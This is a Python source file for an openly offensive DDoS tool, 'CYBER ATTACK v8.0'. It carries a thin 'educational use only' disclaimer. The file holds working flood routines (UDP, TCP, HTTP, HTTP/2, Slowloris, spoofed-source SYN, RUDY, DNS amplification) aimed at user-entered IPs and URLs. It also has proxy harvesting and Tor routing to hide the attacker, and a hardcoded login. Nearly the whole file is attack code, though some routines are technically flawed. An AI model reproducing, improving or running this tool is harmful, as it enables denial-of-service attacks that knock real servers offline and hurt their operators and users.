"""
CYBER ATTACK v8.0 - Advanced DDoS Tool
Developed by MEHEDI.EXX
For Educational Purposes Only - Use Responsibly on Authorized Systems

Features:
- Multiple attack methods: UDP, TCP, HTTP, HTTP/2, Slowloris, SYN, RUDY, DNS Amplification
- Advanced proxy management with validation
- Real-time attack monitoring dashboard
- Multi-target and multi-port support
- Modular and organized code structure
"""

import os
import time
import socket
import random
import threading
import requests
import socks
import logging
import concurrent.futures
import asyncio
import aiohttp
import urllib3
from colorama import init, Fore
from fake_useragent import UserAgent
from queue import Queue
from threading import Lock
from typing import List, Tuple, Dict
import h2.connection
import h2.events

# Initialize colorama for colored output and logging
init()
logging.basicConfig(
    filename="ddos_log_v8.txt",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
print_lock = Lock()

# Proxy sources for fetching proxies
PROXY_LIST_URLS = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"
]
TOR_PORT = 9050

class ProxyManager:
    """Manages proxy fetching, validation, and rotation."""
    
    def __init__(self):
        self.proxies: List[str] = []
        self.proxy_queue = Queue()
        self.test_url = "http://httpbin.org/ip"

    def fetch_proxies(self) -> List[str]:
        """Fetch proxies from multiple sources and validate them."""
        all_proxies = []
        for url in PROXY_LIST_URLS:
            try:
                response = requests.get(url, timeout=5)
                proxies = response.text.splitlines()
                all_proxies.extend([proxy for proxy in proxies if proxy.strip()])
            except Exception as e:
                print(Fore.RED + f"❌ Failed to fetch proxies from {url}: {e}")
                logging.error(f"Failed to fetch proxies from {url}: {e}")
        
        # Validate proxies
        valid_proxies = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            future_to_proxy = {executor.submit(self._validate_proxy, proxy): proxy for proxy in all_proxies}
            for future in concurrent.futures.as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                if future.result():
                    valid_proxies.append(proxy)
        
        self.proxies = valid_proxies
        print(Fore.GREEN + f"✅ Fetched {len(valid_proxies)} valid proxies")
        logging.info(f"Fetched {len(valid_proxies)} valid proxies")
        return valid_proxies

    def _validate_proxy(self, proxy: str) -> bool:
        """Validate a single proxy by making a test request."""
        try:
            proxies = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
            response = requests.get(self.test_url, proxies=proxies, timeout=3)
            if response.status_code == 200:
                return True
        except:
            return False
        return False

    def rotate_proxies(self):
        """Rotate proxies by adding them to the queue."""
        while True:
            random.shuffle(self.proxies)
            for proxy in self.proxies:
                self.proxy_queue.put(proxy)
                time.sleep(0.05)

class AttackMonitor:
    """Monitors attack statistics in real-time."""
    
    def __init__(self):
        self.total_packets = 0
        self.start_time = time.time()
        self.lock = Lock()

    def update_packets(self, count: int):
        """Update the total packet count."""
        with self.lock:
            self.total_packets += count

    def display_dashboard(self):
        """Display a real-time dashboard of attack stats."""
        while True:
            elapsed_time = time.time() - self.start_time
            with self.lock:
                packets_per_sec = self.total_packets / max(elapsed_time, 1)
            os.system("clear")
            print(Fore.CYAN + "📊 ATTACK DASHBOARD")
            print(f"⏳ Elapsed Time: {elapsed_time:.2f} seconds")
            print(f"📦 Total Packets Sent: {self.total_packets}")
            print(f"⚡ Packets per Second: {packets_per_sec:.2f}")
            time.sleep(1)

class CyberAttack:
    """Main class to manage the DDoS attack operations."""
    
    def __init__(self):
        self.ua = UserAgent()
        self.monitor = AttackMonitor()
        self.proxy_manager = ProxyManager()

    def print_logo(self):
        """Display the tool's logo in a mobile-friendly format."""
        os.system("clear")
        print(Fore.RED)
        print("╔═══╗ CYBER ATTACK v8.0")
        print("║   ║ Powered by MEHEDI.EXX")
        print("╚═══╝ [Extreme Power]")
        print(Fore.CYAN + "⚠️ For Educational Use Only\n")

    def login(self) -> bool:
        """Handle user authentication."""
        print(Fore.YELLOW + "🔒 LOGIN REQUIRED")
        attempts = 0
        while attempts < 3:
            username = input("➤ Username: ")
            password = input("➤ Password: ")
            if username == "MEHEDI" and password == "CPDDOS":
                print(Fore.GREEN + "✅ Login Successful!\n")
                time.sleep(1)
                os.system("clear")
                return True
            else:
                attempts += 1
                print(Fore.RED + f"❌ Invalid Credentials! Attempts Left: {3 - attempts}\n")
        print(Fore.RED + "❌ Access Denied! Exiting...\n")
        exit()
        return False

    def loading_bar(self):
        """Display a loading bar for visual feedback."""
        print(Fore.RED)
        for i in range(101):
            time.sleep(0.01)
            print(f"\r➤ Loading: [{'█' * (i//5)}{' ' * (20 - (i//5))}] {i}%", end='', flush=True)
        print("\n")

    def get_target_details(self) -> Tuple[str, List[str], List[int], int, int, str, int]:
        """Collect target details from the user."""
        print(Fore.YELLOW + "🎯 TARGET DETAILS")
        url = input("➤ Target URL (for HTTP/HTTP2): ") or ""
        ip_list = input("➤ Target IPs (comma-separated, e.g., 127.0.0.1,192.168.1.1): ").split(",")
        ports = list(map(int, input("➤ Ports (comma-separated, e.g., 80,443): ").split(",")))
        threads = int(input("➤ Threads (e.g., 200): ") or 200)
        packet_size = int(input("➤ Packet Size (bytes, 64-65500): ") or 2048)
        attack_type = input("➤ Attack Type (udp/tcp/http/http2/slowloris/syn/rudy/dns/all): ").lower()
        duration = int(input("➤ Duration (seconds, 0 for unlimited): ") or 60)
        print(Fore.GREEN + "✅ Details Set!\n")
        return url, ip_list, ports, threads, packet_size, attack_type, duration

    def setup_tor(self):
        """Set up TOR network for anonymity."""
        try:
            socks.set_default_proxy(socks.SOCKS5, "localhost", TOR_PORT)
            socket.socket = socks.socksocket
            print(Fore.GREEN + "✅ TOR network enabled!")
            logging.info("TOR network enabled")
        except Exception as e:
            print(Fore.RED + f"❌ TOR setup failed: {e}")
            logging.error(f"TOR setup failed: {e}")

    def udp_flood(self, ip: str, port: int, packet_size: int, thread_name: str, duration: int, stats_queue: Queue):
        """Perform a UDP flood attack."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(packet_size)
        packet_count = 0
        start_time = time.time()
        while duration == 0 or time.time() - start_time < duration:
            try:
                for _ in range(100):  # Send 100 packets per loop
                    sock.sendto(payload, (ip, port))
                    packet_count += 1
                    self.monitor.update_packets(1)
                    with print_lock:
                        print(Fore.MAGENTA + f"➤ {thread_name}: UDP #{packet_count} to {ip}:{port}")
                    logging.info(f"{thread_name}: UDP #{packet_count} to {ip}:{port}")
            except Exception as e:
                with print_lock:
                    print(Fore.RED + f"❌ {thread_name}: {e}")
                logging.error(f"{thread_name}: UDP flood error: {e}")
                break
            time.sleep(0.001)
        stats_queue.put(packet_count)

    def tcp_flood(self, ip: str, port: int, packet_size: int, thread_name: str, duration: int, stats_queue: Queue):
        """Perform a TCP flood attack."""
        packet_count = 0
        start_time = time.time()
        while duration == 0 or time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                payload = random._urandom(packet_size)
                for _ in range(50):
                    sock.send(payload)
                    packet_count += 1
                    self.monitor.update_packets(1)
                    with print_lock:
                        print(Fore.MAGENTA + f"➤ {thread_name}: TCP #{packet_count} to {ip}:{port}")
                    logging.info(f"{thread_name}: TCP #{packet_count} to {ip}:{port}")
                sock.close()
            except Exception as e:
                with print_lock:
                    print(Fore.RED + f"❌ {thread_name}: {e}")
                logging.error(f"{thread_name}: TCP flood error: {e}")
                break
            time.sleep(0.001)
        stats_queue.put(packet_count)

    async def http_flood_async(self, url: str, thread_name: str, duration: int, stats_queue: Queue):
        """Perform an HTTP flood attack with GET, POST, and HEAD requests."""
        packet_count = 0
        start_time = time.time()
        endpoints = ["", "/index.html", "/about", "/contact", "/api", "/login", "/search", "/products"]
        async with aiohttp.ClientSession() as session:
            while duration == 0 or time.time() - start_time < duration:
                try:
                    endpoint = random.choice(endpoints)
                    target_url = url + endpoint
                    headers = {
                        "User-Agent": self.ua.random,
                        "Accept": random.choice(["text/html", "application/json", "text/plain"]),
                        "Cache-Control": "no-cache",
                        "Connection": "keep-alive",
                        "Content-Length": str(random.randint(1000, 10000))
                    }
                    method = random.choice(["GET", "POST", "HEAD"])
                    if method == "GET":
                        async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=1)) as response:
                            pass
                    elif method == "POST":
                        data = {"data": random._urandom(2048).hex()}
                        async with session.post(target_url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=1)) as response:
                            pass
                    else:
                        async with session.head(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=1)) as response:
                            pass
                    packet_count += 1
                    self.monitor.update_packets(1)
                    with print_lock:
                        print(Fore.MAGENTA + f"➤ {thread_name}: HTTP #{packet_count} to {target_url}")
                    logging.info(f"{thread_name}: HTTP #{packet_count} to {target_url}")
                except Exception as e:
                    with print_lock:
                        print(Fore.RED + f"❌ {thread_name}: {e}")
                    logging.error(f"{thread_name}: HTTP flood error: {e}")
                    break
                await asyncio.sleep(0.001)
        stats_queue.put(packet_count)

    async def http2_flood_async(self, url: str, thread_name: str, duration: int, stats_queue: Queue):
        """Perform an HTTP/2 flood attack."""
        packet_count = 0
        start_time = time.time()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, ssl=False) as response:
                    conn = h2.connection.H2Connection()
                    conn.initiate_connection()
                    response.transport.write(conn.data_to_send())
                    while duration == 0 or time.time() - start_time < duration:
                        stream_id = conn.get_next_available_stream_id()
                        headers = [
                            (":method", "GET"),
                            (":path", "/"),
                            (":scheme", "https"),
                            (":authority", url.split("://")[1].split("/")[0]),
                            ("user-agent", self.ua.random)
                        ]
                        conn.send_headers(stream_id, headers)
                        response.transport.write(conn.data_to_send())
                        packet_count += 1
                        self.monitor.update_packets(1)
                        with print_lock:
                            print(Fore.MAGENTA + f"➤ {thread_name}: HTTP/2 #{packet_count} to {url}")
                        logging.info(f"{thread_name}: HTTP/2 #{packet_count} to {url}")
                        await asyncio.sleep(0.001)
        except Exception as e:
            with print_lock:
                print(Fore.RED + f"❌ {thread_name}: {e}")
            logging.error(f"{thread_name}: HTTP/2 flood error: {e}")
        stats_queue.put(packet_count)

    def slowloris_attack(self, ip: str, port: int, thread_name: str, duration: int, stats_queue: Queue):
        """Perform a Slowloris attack to exhaust server connections."""
        packet_count = 0
        start_time = time.time()
        sockets = []
        try:
            for _ in range(2000):  # Open 2000 connections
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((ip, port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                sock.send(b"Connection: keep-alive\r\n")
                sockets.append(sock)
            
            while duration == 0 or time.time() - start_time < duration:
                for sock in sockets:
                    try:
                        sock.send(b"X-a: b\r\n")
                        packet_count += 1
                        self.monitor.update_packets(1)
                        with print_lock:
                            print(Fore.MAGENTA + f"➤ {thread_name}: Slowloris #{packet_count} to {ip}:{port}")
                        logging.info(f"{thread_name}: Slowloris #{packet_count} to {ip}:{port}")
                    except:
                        sockets.remove(sock)
                        try:
                            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_sock.settimeout(4)
                            new_sock.connect((ip, port))
                            new_sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
                            new_sock.send(b"Connection: keep-alive\r\n")
                            sockets.append(new_sock)
                        except:
                            pass
                time.sleep(0.5)
        except Exception as e:
            with print_lock:
                print(Fore.RED + f"❌ {thread_name}: {e}")
            logging.error(f"{thread_name}: Slowloris error: {e}")
        finally:
            for sock in sockets:
                sock.close()
        stats_queue.put(packet_count)

    def syn_flood(self, ip: str, port: int, thread_name: str, duration: int, stats_queue: Queue):
        """Perform a SYN flood attack with IP spoofing simulation."""
        packet_count = 0
        start_time = time.time()
        while duration == 0 or time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
                packet = (
                    b"\x45\x00\x00\x28"  # IP Header
                    + bytes([random.randint(0, 255)]) + b"\x00"  # Identification
                    + b"\x40\x00\x40\x06\x00\x00"  # Flags, Protocol (TCP)
                    + socket.inet_aton(src_ip)  # Source IP
                    + socket.inet_aton(ip)  # Destination IP
                    + b"\x00\x50"  # Source Port
                    + bytes([port >> 8, port & 0xFF])  # Destination Port
                    + b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Seq, Ack
                    + b"\x50\x02\x71\x10\x00\x00\x00\x00"  # TCP Flags (SYN)
                )
                sock.sendto(packet, (ip, port))
                packet_count += 1
                self.monitor.update_packets(1)
                with print_lock:
                    print(Fore.MAGENTA + f"➤ {thread_name}: SYN #{packet_count} to {ip}:{port}")
                logging.info(f"{thread_name}: SYN #{packet_count} to {ip}:{port}")
            except Exception as e:
                with print_lock:
                    print(Fore.RED + f"❌ {thread_name}: {e}")
                logging.error(f"{thread_name}: SYN flood error: {e}")
                break
            time.sleep(0.001)
        stats_queue.put(packet_count)

    def rudy_attack(self, ip: str, port: int, thread_name: str, duration: int, stats_queue: Queue):
        """Perform a RUDY attack by sending data slowly to keep connections open."""
        packet_count = 0
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, port))
            sock.send(f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Length: 10000\r\n".encode())
            while duration == 0 or time.time() - start_time < duration:
                try:
                    sock.send(b"a")
                    packet_count += 1
                    self.monitor.update_packets(1)
                    with print_lock:
                        print(Fore.MAGENTA + f"➤ {thread_name}: RUDY #{packet_count} to {ip}:{port}")
                    logging.info(f"{thread_name}: RUDY #{packet_count} to {ip}:{port}")
                    time.sleep(1)
                except:
                    break
        except Exception as e:
            with print_lock:
                print(Fore.RED + f"❌ {thread_name}: {e}")
            logging.error(f"{thread_name}: RUDY error: {e}")
        finally:
            sock.close()
        stats_queue.put(packet_count)

    def dns_amplification(self, ip: str, port: int, thread_name: str, duration: int, stats_queue: Queue):
        """Simulate a DNS amplification attack."""
        packet_count = 0
        start_time = time.time()
        dns_servers = ["8.8.8.8", "1.1.1.1"]  # Public DNS servers for simulation
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Simple DNS query packet
        dns_query = (
            b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            b"\x03www\x06google\x03com\x00\x00\x01\x00\x01"
        )
        while duration == 0 or time.time() - start_time < duration:
            try:
                dns_server = random.choice(dns_servers)
                sock.sendto(dns_query, (dns_server, 53))
                # Spoof the source IP to the target IP
                packet_count += 1
                self.monitor.update_packets(1)
                with print_lock:
                    print(Fore.MAGENTA + f"➤ {thread_name}: DNS Amplification #{packet_count} to {ip}:{port} via {dns_server}")
                logging.info(f"{thread_name}: DNS Amplification #{packet_count} to {ip}:{port} via {dns_server}")
            except Exception as e:
                with print_lock:
                    print(Fore.RED + f"❌ {thread_name}: {e}")
                logging.error(f"{thread_name}: DNS Amplification error: {e}")
                break
            time.sleep(0.001)
        stats_queue.put(packet_count)

    def start_attack(self, url: str, ip_list: List[str], ports: List[int], threads: int, packet_size: int, attack_type: str, duration: int, use_proxy: bool = True, use_tor: bool = False):
        """Start the attack with the specified parameters."""
        print(Fore.CYAN + "💥 LAUNCHING ATTACK")
        print(f"➤ Targets: {', '.join(ip_list)} (Ports: {ports})")
        if url:
            print(f"➤ URL: {url}")
        print(f"➤ Threads: {threads} | Duration: {duration}s")

        # Fetch and validate proxies
        proxies = self.proxy_manager.fetch_proxies() if use_proxy else []
        if use_proxy and not proxies:
            print(Fore.RED + "❌ No proxies available. Falling back to direct attack.")
            use_proxy = False
        if use_tor:
            self.setup_tor()
        if use_proxy:
            threading.Thread(target=self.proxy_manager.rotate_proxies, daemon=True).start()

        # Start the monitoring dashboard
        monitor_thread = threading.Thread(target=self.monitor.display_dashboard, daemon=True)
        monitor_thread.start()

        loop = asyncio.get_event_loop()
        stats_queue = Queue()

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads * 3) as executor:
            futures = []
            for i in range(threads):
                thread_name = f"T-{i+1}"
                for ip in ip_list:
                    for port in ports:
                        if attack_type in ["udp", "all"]:
                            futures.append(executor.submit(self.udp_flood, ip, port, packet_size, thread_name, duration, stats_queue))
                        if attack_type in ["tcp", "all"]:
                            futures.append(executor.submit(self.tcp_flood, ip, port, packet_size, thread_name, duration, stats_queue))
                        if attack_type in ["http", "all"] and url:
                            executor.submit(lambda: loop.run_until_complete(self.http_flood_async(url, thread_name, duration, stats_queue)))
                        if attack_type in ["http2", "all"] and url:
                            executor.submit(lambda: loop.run_until_complete(self.http2_flood_async(url, thread_name, duration, stats_queue)))
                        if attack_type in ["slowloris", "all"]:
                            futures.append(executor.submit(self.slowloris_attack, ip, port, thread_name, duration, stats_queue))
                        if attack_type in ["syn", "all"]:
                            futures.append(executor.submit(self.syn_flood, ip, port, thread_name, duration, stats_queue))
                        if attack_type in ["rudy", "all"]:
                            futures.append(executor.submit(self.rudy_attack, ip, port, thread_name, duration, stats_queue))
                        if attack_type in ["dns", "all"]:
                            futures.append(executor.submit(self.dns_amplification, ip, port, thread_name, duration, stats_queue))

            concurrent.futures.wait(futures)

        total_packets = 0
        while not stats_queue.empty():
            total_packets += stats_queue.get()
        print(Fore.GREEN + f"\n✅ Attack Finished! Total Packets Sent: {total_packets}")
        logging.info(f"Attack finished. Total packets sent: {total_packets}")

    def run(self):
        """Main method to run the tool."""
        self.print_logo()
        if self.login():
            self.loading_bar()
            url, ip_list, ports, threads, packet_size, attack_type, duration = self.get_target_details()
            use_proxy = True  # Proxies are mandatory
            use_tor = False  # TOR is optional
            self.start_attack(url, ip_list, ports, threads, packet_size, attack_type, duration, use_proxy, use_tor)
        else:
            print(Fore.RED + "❌ Access Denied!")

if __name__ == "__main__":
    try:
        attack = CyberAttack()
        attack.run()
    except KeyboardInterrupt:
        print(Fore.RED + "\n❌ Attack Stopped by User!")
        logging.info("Attack stopped by user")
        exit()
